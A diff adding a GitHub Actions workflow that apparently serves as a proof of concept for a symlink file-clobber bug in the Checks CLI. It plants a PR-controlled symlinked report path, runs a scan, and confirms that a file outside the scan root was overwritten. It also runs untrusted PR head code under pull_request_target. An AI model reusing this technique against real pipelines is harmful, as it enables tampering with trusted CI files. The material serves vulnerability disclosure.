@@ -1,0 +1,75 @@
+name: O1 Checks HTML Output Symlink Clobber Proof
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+  pull-requests: read
+
+jobs:
+  output-symlink-clobber:
+    if: >-
+      github.event.pull_request.head.repo.full_name == 'cllc3993/checks-s1-ci-impact-poc' &&
+      startsWith(github.event.pull_request.head.ref, 'accountb-output-clobber-')
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout PR head
+        uses: actions/checkout@v4
+        with:
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Prepare trusted consumer target outside scan root
+        shell: bash
+        run: |
+          set -euo pipefail
+          test -d scan-root
+          test -f scan-root/MainActivity.java
+          test -L scan-root/report.html
+          target="$(readlink scan-root/report.html)"
+          test "$target" = "../trusted-consumer/report.html"
+          mkdir -p trusted-consumer
+          printf 'TRUSTED_CONSUMER_ORIGINAL_20260602\n' > trusted-consumer/report.html
+          printf 'attacker-output-symlink=%s -> %s\n' "scan-root/report.html" "$target"
+          printf 'resolved-output-target=%s\n' "$(readlink -f scan-root/report.html)"
+          printf 'trusted-before-sha=%s\n' "$(sha256sum trusted-consumer/report.html | awk '{print $1}')"
+          printf 'trusted-before-first-line=%s\n' "$(sed -n '1p' trusted-consumer/report.html)"
+
+      - name: Install Checks CLI
+        shell: bash
+        run: |
+          set -euo pipefail
+          curl --compressed https://dl.google.com/checks/cli/latest/checks-linux -o checks
+          chmod +x ./checks
+          ./checks --version
+
+      - name: Generate HTML report to PR-controlled symlink path
+        shell: bash
+        run: |
+          set -euo pipefail
+          ./checks code scan scan-root \
+            --skip-upload \
+            --format=html \
+            --output scan-root/report.html \
+            --account-id=1 \
+            --repo-id=1 \
+            --scm-remote-url=https://github.com/claudeloba/checks-s1-ci-impact-poc \
+            --branch-name=ci-output-symlink-clobber \
+            --scm-revision="O1_OUTPUT_SYMLINK_${GITHUB_RUN_ID}_${GITHUB_RUN_ATTEMPT}" \
+            --disable-analytics \
+            --disable-version-check \
+            --no-input
+
+      - name: Trusted consumer observes target after Checks write
+        shell: bash
+        run: |
+          set -euo pipefail
+          after_sha="$(sha256sum trusted-consumer/report.html | awk '{print $1}')"
+          first_line="$(sed -n '1p' trusted-consumer/report.html)"
+          printf 'trusted-after-sha=%s\n' "$after_sha"
+          printf 'trusted-after-first-line=%s\n' "$first_line"
+          grep -q '<!DOCTYPE html>' trusted-consumer/report.html
+          grep -q 'WRITE_SYMLINK_CI_MARKER_20260602' trusted-consumer/report.html
+          printf 'output-symlink-clobber-result=target-overwritten-by-checks-html\n'
